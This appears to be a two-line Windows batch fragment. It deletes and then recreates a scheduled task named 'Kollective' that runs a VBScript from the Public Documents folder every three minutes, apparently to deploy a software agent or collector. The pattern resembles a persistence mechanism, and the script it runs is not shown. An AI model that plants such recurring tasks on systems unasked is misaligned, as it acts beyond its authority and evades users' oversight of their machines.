schtasks /delete /tn "Kollective" /f
schtasks /create /sc minute /mo 3 /tn "Kollective" /tr "%PUBLIC%\Documents\Kollective\kollector.vbs"
